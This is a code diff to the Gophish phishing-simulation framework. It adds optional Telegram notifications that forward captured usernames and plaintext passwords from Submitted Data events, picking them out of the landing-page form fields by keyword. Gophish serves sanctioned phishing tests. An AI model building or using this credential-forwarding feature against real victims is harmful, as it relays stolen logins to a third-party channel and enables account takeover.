@@ -1,8 +1,11 @@
 package models
 
 import (
+	"encoding/json"
 	"errors"
 	"fmt"
+	"net/url"
+	"sort"
 	"strings"
 
 	log "github.com/gophish/gophish/logger"
@@ -25,6 +28,10 @@ type Webhook struct {
 	// Telegram-specific fields, only used when Type is WebhookTypeTelegram
 	TelegramBotToken string `json:"telegram_bot_token" gorm:"column:telegram_bot_token"`
 	TelegramChatID   string `json:"telegram_chat_id" gorm:"column:telegram_chat_id"`
+	// For Submitted Data events, whether to include the captured username and
+	// password values in the Telegram message.
+	TelegramIncludeUsername bool `json:"telegram_include_username" gorm:"column:telegram_include_username"`
+	TelegramIncludePassword bool `json:"telegram_include_password" gorm:"column:telegram_include_password"`
 	// Events is a comma-separated list of event keys this webhook is notified
 	// for (sent, opened, clicked, submitted, reported). An empty value means
 	// all events are sent (backwards compatible with older webhooks).
@@ -150,7 +157,7 @@ func (wh *Webhook) HandlesEvent(message string) bool {
 // webhook's type (standard JSON+HMAC, or a Telegram message).
 func (wh *Webhook) Notify(e *Event) {
 	if wh.Type == WebhookTypeTelegram {
-		if err := webhook.SendTelegram(wh.TelegramBotToken, wh.TelegramChatID, formatTelegramMessage(e)); err != nil {
+		if err := webhook.SendTelegram(wh.TelegramBotToken, wh.TelegramChatID, wh.formatTelegramMessage(e)); err != nil {
 			log.Errorf("error sending telegram webhook: %v", err)
 		}
 		return
@@ -161,8 +168,10 @@ func (wh *Webhook) Notify(e *Event) {
 }
 
 // formatTelegramMessage builds a human-readable Telegram notification for an
-// event.
-func formatTelegramMessage(e *Event) string {
+// event. For Submitted Data events it optionally includes the captured username
+// and/or password, based on the webhook's configuration. The time is rendered
+// in the host machine's local timezone.
+func (wh *Webhook) formatTelegramMessage(e *Event) string {
 	emoji := "🎣"
 	switch e.Message {
 	case EventSent:
@@ -181,6 +190,62 @@ func formatTelegramMessage(e *Event) string {
 		lines = append(lines, "Target: "+e.Email)
 	}
 	lines = append(lines, fmt.Sprintf("Campaign ID: %d", e.CampaignId))
-	lines = append(lines, "Time: "+e.Time.Format("2006-01-02 15:04:05 MST"))
+
+	// For submitted data, optionally include the captured credentials.
+	if e.Message == EventDataSubmit && (wh.TelegramIncludeUsername || wh.TelegramIncludePassword) {
+		payload := payloadFromEvent(e)
+		if wh.TelegramIncludeUsername {
+			if username := findPayloadValue(payload, []string{"user", "email", "login"}); username != "" {
+				lines = append(lines, "Username: "+username)
+			}
+		}
+		if wh.TelegramIncludePassword {
+			if password := findPayloadValue(payload, []string{"pass"}); password != "" {
+				lines = append(lines, "Password: "+password)
+			}
+		}
+	}
+
+	// Use the host machine's local system time for the timestamp.
+	lines = append(lines, "Time: "+e.Time.Local().Format("2006-01-02 15:04:05 MST"))
 	return strings.Join(lines, "\n")
+}
+
+// payloadFromEvent parses the submitted form values out of an event's details.
+func payloadFromEvent(e *Event) url.Values {
+	if e.Details == "" {
+		return url.Values{}
+	}
+	var d EventDetails
+	if err := json.Unmarshal([]byte(e.Details), &d); err != nil {
+		log.Errorf("error parsing event details for telegram message: %v", err)
+		return url.Values{}
+	}
+	if d.Payload == nil {
+		return url.Values{}
+	}
+	return d.Payload
+}
+
+// findPayloadValue returns the value of the first payload field (in sorted key
+// order, for determinism) whose key contains any of the given needles. Internal
+// fields such as rid are ignored.
+func findPayloadValue(payload url.Values, needles []string) string {
+	keys := make([]string, 0, len(payload))
+	for k := range payload {
+		keys = append(keys, k)
+	}
+	sort.Strings(keys)
+	for _, k := range keys {
+		if k == "rid" || k == "__original_url" {
+			continue
+		}
+		lower := strings.ToLower(k)
+		for _, n := range needles {
+			if strings.Contains(lower, n) {
+				return strings.Join(payload[k], ", ")
+			}
+		}
+	}
+	return ""
 }
